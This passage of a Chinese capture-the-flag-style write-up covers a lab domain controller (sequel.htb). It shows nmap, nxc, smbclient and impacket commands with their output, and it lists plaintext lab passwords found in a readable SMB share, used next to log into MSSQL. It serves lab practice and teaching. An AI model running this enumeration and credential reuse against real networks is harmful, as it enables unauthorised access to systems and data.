Windows Server <span class="hljs-number">2019</span> (<span class="hljs-number">97</span>%), Microsoft Windows <span class="hljs-number">10</span> <span class="hljs-number">1903</span> <span class="hljs-operator">-</span> <span class="hljs-number">21</span>H1 (<span class="hljs-number">91</span>%)<br>No exact OS matches for host (test conditions non-ideal).<br>Network <span class="hljs-params">Distance:</span> <span class="hljs-number">2</span> hops<br>Service <span class="hljs-params">Info:</span> <span class="hljs-params">Host:</span> DC01; <span class="hljs-params">OS:</span> Windows; <span class="hljs-params">CPE:</span> cpe:<span class="hljs-operator">/</span>o:microsoft:windows<br><br>Host script <span class="hljs-params">results:</span><br>| <span class="hljs-params">smb2-security-mode:</span> <br>|   <span class="hljs-number">3.1</span>.<span class="hljs-number">1</span>: <br>|_    Message signing enabled and required<br>|<span class="hljs-params">_clock-skew:</span> <span class="hljs-params">mean:</span> <span class="hljs-number">5</span>s, <span class="hljs-params">deviation:</span> <span class="hljs-number">0</span>s, <span class="hljs-params">median:</span> <span class="hljs-number">5</span>s<br>| <span class="hljs-params">smb2-time:</span> <br>|   <span class="hljs-params">date:</span> <span class="hljs-number">202</span>6-<span class="hljs-number">0</span>1-<span class="hljs-number">21</span>T05:<span class="hljs-number">44</span>:<span class="hljs-number">41</span><br>|_  <span class="hljs-params">start_date:</span> N<span class="hljs-symbol">/A</span><br><br>TRACEROUTE (using port <span class="hljs-number">445</span><span class="hljs-operator">/</span>tcp)<br>HOP RTT       ADDRESS<br><span class="hljs-number">1</span>   <span class="hljs-number">165.93</span> ms <span class="hljs-number">10.10</span>.<span class="hljs-number">14.1</span><br><span class="hljs-number">2</span>   <span class="hljs-number">170.71</span> ms <span class="hljs-number">10.129</span>.<span class="hljs-number">186.96</span><br><br>OS and Service detection performed. Please report any incorrect results at https:<span class="hljs-operator">//</span>nmap.org<span class="hljs-operator">/</span>submit<span class="hljs-symbol">/</span> .<br>Nmap <span class="hljs-params">done:</span> <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">112.70</span> seconds<br></code></pre></td></tr></table></figure>
+
+<p>将得到的域名写入hosts</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;10.129.186.96 DC01.sequel.htb sequel.htb&quot;</span> &gt;&gt; /etc/hosts<br></code></pre></td></tr></table></figure>
+
+<p>smb服务共享文件探测</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# nxc smb <span class="hljs-number">10.129</span><span class="hljs-number">.186</span><span class="hljs-number">.96</span> -u <span class="hljs-string">&#x27;rose&#x27;</span> -p <span class="hljs-string">&#x27;KxEPkKe6R8su&#x27;</span> <span class="hljs-comment">--shares</span><br><br>SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.186</span><span class="hljs-number">.96</span>   <span class="hljs-number">445</span>    DC01             [*] Windows <span class="hljs-number">10</span> / <span class="hljs-keyword">Server</span> <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> x64 (<span class="hljs-type">name</span>:DC01) (<span class="hljs-keyword">domain</span>:sequel.htb) (signing:<span class="hljs-keyword">True</span>) (SMBv1:<span class="hljs-keyword">None</span>) (<span class="hljs-keyword">Null</span> Auth:<span class="hljs-keyword">True</span>)<br>SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.186</span><span class="hljs-number">.96</span>   <span class="hljs-number">445</span>    DC01             [+] sequel.htb\rose:KxEPkKe6R8su <br>SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.186</span><span class="hljs-number">.96</span>   <span class="hljs-number">445</span>    DC01             [*] Enumerated shares<br>SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.186</span><span class="hljs-number">.96</span>   <span class="hljs-number">445</span>    DC01             <span class="hljs-keyword">Share</span>           Permissions     Remark<br>SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.186</span><span class="hljs-number">.96</span>   <span class="hljs-number">445</span>    DC01             <span class="hljs-comment">-----           -----------     ------</span><br>SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.186</span><span class="hljs-number">.96</span>   <span class="hljs-number">445</span>    DC01             Accounting Department <span class="hljs-keyword">READ</span>            <br>SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.186</span><span class="hljs-number">.96</span>   <span class="hljs-number">445</span>    DC01             <span class="hljs-keyword">ADMIN</span>$                          Remote <span class="hljs-keyword">Admin</span><br>SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.186</span><span class="hljs-number">.96</span>   <span class="hljs-number">445</span>    DC01             C$                              <span class="hljs-keyword">Default</span> <span class="hljs-keyword">share</span><br>SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.186</span><span class="hljs-number">.96</span>   <span class="hljs-number">445</span>    DC01             IPC$            <span class="hljs-keyword">READ</span>            Remote IPC<br>SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.186</span><span class="hljs-number">.96</span>   <span class="hljs-number">445</span>    DC01             NETLOGON        <span class="hljs-keyword">READ</span>            Logon <span class="hljs-keyword">server</span> <span class="hljs-keyword">share</span> <br>SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.186</span><span class="hljs-number">.96</span>   <span class="hljs-number">445</span>    DC01             SYSVOL          <span class="hljs-keyword">READ</span>            Logon <span class="hljs-keyword">server</span> <span class="hljs-keyword">share</span> <br>SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.186</span><span class="hljs-number">.96</span>   <span class="hljs-number">445</span>    DC01             Users           <span class="hljs-keyword">READ</span>     <br></code></pre></td></tr></table></figure>
+
+<p>得到非默认目录Users，前往探查。</p>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs tap">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─<span class="hljs-comment"># smbclient \\\\10.129.186.96\\Users -U rose</span><br>Password for [WORKGROUP\rose]:<br>Try &quot;help&quot; to get a list of possible commands.<br>smb: \&gt; dir<br>  .                                  DR       <span class="hljs-number"> 0 </span> Sun Jun <span class="hljs-number"> 9 </span>09:42:11 2024<br>  ..                                 DR       <span class="hljs-number"> 0 </span> Sun Jun <span class="hljs-number"> 9 </span>09:42:11 2024<br>  Default                           DHR       <span class="hljs-number"> 0 </span> Sun Jun <span class="hljs-number"> 9 </span>07:17:29 2024<br>  desktop.ini                       AHS     <span class="hljs-number"> 174 </span> Sat Sep<span class="hljs-number"> 15 </span>03:16:48 2018<br><br>               <span class="hljs-number"> 6367231 </span>blocks of size 4096.<span class="hljs-number"> 924175 </span>blocks available<br>smb: \&gt; get desktop.ini<br>getting file \desktop.ini of size<span class="hljs-number"> 174 </span>as desktop.ini (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)<br>smb: \&gt; cd Default\<br>smb: \Default\&gt; dir<br>  .                                 DHR       <span class="hljs-number"> 0 </span> Sun Jun <span class="hljs-number"> 9 </span>07:17:29 2024<br>  ..                                DHR       <span class="hljs-number"> 0 </span> Sun Jun <span class="hljs-number"> 9 </span>07:17:29 2024<br>  AppData                            DH       <span class="hljs-number"> 0 </span> Sat Sep<span class="hljs-number"> 15 </span>03:19:00 2018<br>  Desktop                            DR       <span class="hljs-number"> 0 </span> Sat Sep<span class="hljs-number"> 15 </span>03:19:00 2018<br>  Documents                          DR       <span class="hljs-number"> 0 </span> Sat Jun <span class="hljs-number"> 8 </span>21:29:57 2024<br>  Downloads                          DR       <span class="hljs-number"> 0 </span> Sat Sep<span class="hljs-number"> 15 </span>03:19:00 2018<br>  Favorites                          DR       <span class="hljs-number"> 0 </span> Sat Sep<span class="hljs-number"> 15 </span>03:19:00 2018<br>  Links                              DR       <span class="hljs-number"> 0 </span> Sat Sep<span class="hljs-number"> 15 </span>03:19:00 2018<br>  Music                              DR       <span class="hljs-number"> 0 </span> Sat Sep<span class="hljs-number"> 15 </span>03:19:00 2018<br>  NTUSER.DAT                          A  <span class="hljs-number"> 262144 </span> Sat Jun <span class="hljs-number"> 8 </span>21:29:57 2024<br>  NTUSER.DAT.LOG1                   AHS   <span class="hljs-number"> 57344 </span> Sat Sep<span class="hljs-number"> 15 </span>02:09:26 2018<br>  NTUSER.DAT.LOG2                   AHS       <span class="hljs-number"> 0 </span> Sat Sep<span class="hljs-number"> 15 </span>02:09:26 2018<br>  NTUSER.DAT&#123;1c3790b4-b8ad-11e8-aa21-e41d2d101530&#125;.TM.blf    AHS   <span class="hljs-number"> 65536 </span> Sat Jun <span class="hljs-number"> 8 </span>21:29:57 2024<br>  NTUSER.DAT&#123;1c3790b4-b8ad-11e8-aa21-e41d2d101530&#125;.TMContainer00000000000000000001.regtrans-ms    AHS  <span class="hljs-number"> 524288 </span> Sat Jun <span class="hljs-number"> 8 </span>21:29:57 2024<br>  NTUSER.DAT&#123;1c3790b4-b8ad-11e8-aa21-e41d2d101530&#125;.TMContainer00000000000000000002.regtrans-ms    AHS  <span class="hljs-number"> 524288 </span> Sat Jun <span class="hljs-number"> 8 </span>21:29:57 2024<br>  Pictures                           DR       <span class="hljs-number"> 0 </span> Sat Sep<span class="hljs-number"> 15 </span>03:19:00 2018<br>  Saved Games                         D       <span class="hljs-number"> 0 </span> Sat Sep<span class="hljs-number"> 15 </span>03:19:00 2018<br>  Videos                             DR       <span class="hljs-number"> 0 </span> Sat Sep<span class="hljs-number"> 15 </span>03:19:00 2018<br><br>               <span class="hljs-number"> 6367231 </span>blocks of size 4096.<span class="hljs-number"> 924175 </span>blocks available<br>smb: \Default\&gt; <br></code></pre></td></tr></table></figure>
+
+<p>似乎没有什么值得看的文件，列出用户试试。</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs dns">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# nxc smb <span class="hljs-number">10.129.186.96</span> -u &#x27;rose&#x27; -p &#x27;KxEPkKe6R8su&#x27; --users <br>      ┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# nxc smb <span class="hljs-number">10.129.186.96</span> -u &#x27;rose&#x27; -p &#x27;KxEPkKe6R8su&#x27; --users<br>SMB         <span class="hljs-number">10.129.186.96</span>   <span class="hljs-number">445</span>    DC01             [*] Windows <span class="hljs-number">10</span> / Server <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:None) (Null Auth:True)<br>SMB         <span class="hljs-number">10.129.186.96</span>   <span class="hljs-number">445</span>    DC01             [+] sequel.htb\rose:KxEPkKe6R8su <br>SMB         <span class="hljs-number">10.129.186.96</span>   <span class="hljs-number">445</span>    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                <br>SMB         <span class="hljs-number">10.129.186.96</span>   <span class="hljs-number">445</span>    DC01             Administrator                 <span class="hljs-number">2024-06-08</span> <span class="hljs-number">16:32:20 0</span>       Built-in account for administering the computer/domain                                                                                                                                                  <br>SMB         <span class="hljs-number">10.129.186.96</span>   <span class="hljs-number">445</span>    DC01             Guest                         <span class="hljs-number">2024-12-25</span> <span class="hljs-number">14:44:53 0</span>       Built-in account for guest access to the computer/domain                                                                                                                                                <br>SMB         <span class="hljs-number">10.129.186.96</span>   <span class="hljs-number">445</span>    DC01             krbtgt                        <span class="hljs-number">2024-06-08</span> <span class="hljs-number">16:40:23 0</span>       Key Distribution Center Service Account <br>SMB         <span class="hljs-number">10.129.186.96</span>   <span class="hljs-number">445</span>    DC01             michael                       <span class="hljs-number">2024-06-08</span> <span class="hljs-number">16:47:37 0</span>        <br>SMB         <span class="hljs-number">10.129.186.96</span>   <span class="hljs-number">445</span>    DC01             ryan                          <span class="hljs-number">2024-06-08</span> <span class="hljs-number">16:55:45 0</span>        <br>SMB         <span class="hljs-number">10.129.186.96</span>   <span class="hljs-number">445</span>    DC01             oscar                         <span class="hljs-number">2024-06-08</span> <span class="hljs-number">16:56:36 0</span>        <br>SMB         <span class="hljs-number">10.129.186.96</span>   <span class="hljs-number">445</span>    DC01             sql_svc                       <span class="hljs-number">2024-06-09</span> <span class="hljs-number">07:58:42 0</span>        <br>SMB         <span class="hljs-number">10.129.186.96</span>   <span class="hljs-number">445</span>    DC01             rose                          <span class="hljs-number">2024-12-25</span> <span class="hljs-number">14:44:54 0</span>        <br>SMB         <span class="hljs-number">10.129.186.96</span>   <span class="hljs-number">445</span>    DC01             ca_svc                        <span class="hljs-number">2026-01-21</span> <span class="hljs-number">06:02:29 0</span>        <br>SMB         <span class="hljs-number">10.129.186.96</span>   <span class="hljs-number">445</span>    DC01             [*] Enumerated <span class="hljs-number">9</span> local users: SEQUEL<br>                                                        <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gradle">┌──(root㉿kaada)-[<span class="hljs-regexp">/home/</span>kali/Desktop]<br>└─# nxc winrm <span class="hljs-number">10.129</span>.<span class="hljs-number">186.96</span> -u <span class="hljs-string">&#x27;rose&#x27;</span> -p <span class="hljs-string">&#x27;KxEPkKe6R8su&#x27;</span> <br>WINRM       <span class="hljs-number">10.129</span>.<span class="hljs-number">186.96</span>   <span class="hljs-number">5985</span>   DC01             [*] Windows <span class="hljs-number">10</span> / Server <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> (name:DC01) (domain:sequel.htb) <br><span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/python3/</span>dist-packages<span class="hljs-regexp">/spnego/</span>_ntlm_raw/crypto.py:<span class="hljs-number">46</span>: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed <span class="hljs-keyword">from</span> cryptography.hazmat.primitives.ciphers.algorithms in <span class="hljs-number">48.0</span>.<span class="hljs-number">0</span>.<br>  arc4 = algorithms.ARC4(self._key)<br>WINRM       <span class="hljs-number">10.129</span>.<span class="hljs-number">186.96</span>   <span class="hljs-number">5985</span>   DC01             [-] sequel.htb\rose:KxEPkKe6R8su<br></code></pre></td></tr></table></figure>
+
+<p>没有远程操作权限，觉得正常。</p>
+<p>没有头绪，返回smb共享文件目录，发现还有一个非默认文件目录Accounting Department（所以刚刚为什么没有发现？还是自己太猪了。）</p>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs tap">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─<span class="hljs-comment"># smbclient \\\\10.129.186.96\\Accounting\ Department -U rose</span><br>Password for [WORKGROUP\rose]:<br>Try &quot;help&quot; to get a list of possible commands.<br>smb: \&gt; dir<br>  .                                   D       <span class="hljs-number"> 0 </span> Sun Jun <span class="hljs-number"> 9 </span>06:52:21 2024<br>  ..                                  D       <span class="hljs-number"> 0 </span> Sun Jun <span class="hljs-number"> 9 </span>06:52:21 2024<br>  accounting_2024.xlsx                A   <span class="hljs-number"> 10217 </span> Sun Jun <span class="hljs-number"> 9 </span>06:14:49 2024<br>  accounts.xlsx                       A    <span class="hljs-number"> 6780 </span> Sun Jun <span class="hljs-number"> 9 </span>06:52:07 2024<br><br>               <span class="hljs-number"> 6367231 </span>blocks of size 4096.<span class="hljs-number"> 926603 </span>blocks available<br>smb: \&gt; <br><br></code></pre></td></tr></table></figure>
+
+<p>注意这里的空格要加一个转义符。</p>
+<p>查看accounts.xlsx 得到账户和密码。我不知道为什么微软的excel打不开下载的文件，只能用更底层的形式查看密码。</p>
+<p><strong>权限配置错误</strong>：管理员在创建 SMB 共享时，如果权限设置过宽（如允许 <code>Everyone</code> 或 <code>Domain Users</code> 读取），就会导致敏感数据泄露。 <strong>Office 文件结构</strong>：现代 Office 文档 (<code>.xlsx</code>, <code>.docx</code>) 本质上是 <strong>ZIP 压缩包</strong>，内部由多个 XML 文件组成。即使没有安装 Office 软件，攻击者也可以解压文件并直接读取 XML 里的 <code>SharedStrings</code> 或元数据，从而绕过某些应用层的保护或直接获取内容。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> standalone=<span class="hljs-string">&quot;yes&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">sst</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://schemas.openxmlformats.org/spreadsheetml/2006/main&quot;</span> <span class="hljs-attr">count</span>=<span class="hljs-string">&quot;25&quot;</span> <span class="hljs-attr">uniqueCount</span>=<span class="hljs-string">&quot;24&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">t</span> <span class="hljs-attr">xml:space</span>=<span class="hljs-string">&quot;preserve&quot;</span>&gt;</span>First Name<span class="hljs-tag">&lt;/<span class="hljs-name">t</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">t</span> <span class="hljs-attr">xml:space</span>=<span class="hljs-string">&quot;preserve&quot;</span>&gt;</span>Last Name<span class="hljs-tag">&lt;/<span class="hljs-name">t</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">t</span> <span class="hljs-attr">xml:space</span>=<span class="hljs-string">&quot;preserve&quot;</span>&gt;</span>Email<span class="hljs-tag">&lt;/<span class="hljs-name">t</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">t</span> <span class="hljs-attr">xml:space</span>=<span class="hljs-string">&quot;preserve&quot;</span>&gt;</span>Username<span class="hljs-tag">&lt;/<span class="hljs-name">t</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">t</span> <span class="hljs-attr">xml:space</span>=<span class="hljs-string">&quot;preserve&quot;</span>&gt;</span>Password<span class="hljs-tag">&lt;/<span class="hljs-name">t</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">t</span> <span class="hljs-attr">xml:space</span>=<span class="hljs-string">&quot;preserve&quot;</span>&gt;</span>Angela<span class="hljs-tag">&lt;/<span class="hljs-name">t</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">t</span> <span class="hljs-attr">xml:space</span>=<span class="hljs-string">&quot;preserve&quot;</span>&gt;</span>Martin<span class="hljs-tag">&lt;/<span class="hljs-name">t</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">t</span> <span class="hljs-attr">xml:space</span>=<span class="hljs-string">&quot;preserve&quot;</span>&gt;</span>angela@sequel.htb<span class="hljs-tag">&lt;/<span class="hljs-name">t</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">t</span> <span class="hljs-attr">xml:space</span>=<span class="hljs-string">&quot;preserve&quot;</span>&gt;</span>angela<span class="hljs-tag">&lt;/<span class="hljs-name">t</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">t</span> <span class="hljs-attr">xml:space</span>=<span class="hljs-string">&quot;preserve&quot;</span>&gt;</span>0fwz7Q4mSpurIt99<span class="hljs-tag">&lt;/<span class="hljs-name">t</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">t</span> <span class="hljs-attr">xml:space</span>=<span class="hljs-string">&quot;preserve&quot;</span>&gt;</span>Oscar<span class="hljs-tag">&lt;/<span class="hljs-name">t</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">t</span> <span class="hljs-attr">xml:space</span>=<span class="hljs-string">&quot;preserve&quot;</span>&gt;</span>Martinez<span class="hljs-tag">&lt;/<span class="hljs-name">t</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">t</span> <span class="hljs-attr">xml:space</span>=<span class="hljs-string">&quot;preserve&quot;</span>&gt;</span>oscar@sequel.htb<span class="hljs-tag">&lt;/<span class="hljs-name">t</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">t</span> <span class="hljs-attr">xml:space</span>=<span class="hljs-string">&quot;preserve&quot;</span>&gt;</span>oscar<span class="hljs-tag">&lt;/<span class="hljs-name">t</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">t</span> <span class="hljs-attr">xml:space</span>=<span class="hljs-string">&quot;preserve&quot;</span>&gt;</span>86LxLBMgEWaKUnBG<span class="hljs-tag">&lt;/<span class="hljs-name">t</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">t</span> <span class="hljs-attr">xml:space</span>=<span class="hljs-string">&quot;preserve&quot;</span>&gt;</span>Kevin<span class="hljs-tag">&lt;/<span class="hljs-name">t</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">t</span> <span class="hljs-attr">xml:space</span>=<span class="hljs-string">&quot;preserve&quot;</span>&gt;</span>Malone<span class="hljs-tag">&lt;/<span class="hljs-name">t</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">t</span> <span class="hljs-attr">xml:space</span>=<span class="hljs-string">&quot;preserve&quot;</span>&gt;</span>kevin@sequel.htb<span class="hljs-tag">&lt;/<span class="hljs-name">t</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">t</span> <span class="hljs-attr">xml:space</span>=<span class="hljs-string">&quot;preserve&quot;</span>&gt;</span>kevin<span class="hljs-tag">&lt;/<span class="hljs-name">t</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">t</span> <span class="hljs-attr">xml:space</span>=<span class="hljs-string">&quot;preserve&quot;</span>&gt;</span>Md9Wlq1E5bZnVDVo<span class="hljs-tag">&lt;/<span class="hljs-name">t</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">t</span> <span class="hljs-attr">xml:space</span>=<span class="hljs-string">&quot;preserve&quot;</span>&gt;</span>NULL<span class="hljs-tag">&lt;/<span class="hljs-name">t</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">t</span> <span class="hljs-attr">xml:space</span>=<span class="hljs-string">&quot;preserve&quot;</span>&gt;</span>sa@sequel.htb<span class="hljs-tag">&lt;/<span class="hljs-name">t</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">t</span> <span class="hljs-attr">xml:space</span>=<span class="hljs-string">&quot;preserve&quot;</span>&gt;</span>sa<span class="hljs-tag">&lt;/<span class="hljs-name">t</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">t</span> <span class="hljs-attr">xml:space</span>=<span class="hljs-string">&quot;preserve&quot;</span>&gt;</span>MSSQLP@ssw0rd!<span class="hljs-tag">&lt;/<span class="hljs-name">t</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">si</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">sst</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>得到oscar的密码86LxLBMgEWaKUnBG和一个名为sa的账户，密码为MSSQLP@ssw0rd!</p>
+<p>合理怀疑是mssql的凭据。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# impacket-mssqlclient sa:<span class="hljs-string">&#x27;MSSQLP@ssw0rd!&#x27;</span>@<span class="hljs-number">10.129</span><span class="hljs-number">.186</span><span class="hljs-number">.96</span><br>Impacket v0<span class="hljs-number">.14</span><span class="hljs-number">.0</span>.dev0 - Copyright Fortra, LLC <span class="hljs-keyword">and</span> its affiliated companies <br><br>[*] Encryption required, switching <span class="hljs-keyword">to</span> TLS<br>[*] ENVCHANGE(<span class="hljs-keyword">DATABASE</span>): <span class="hljs-built_in">Old</span> <span class="hljs-keyword">Value</span>: master, <span class="hljs-built_in">New</span> <span class="hljs-keyword">Value</span>: master<br>[*] ENVCHANGE(<span class="hljs-keyword">LANGUAGE</span>): 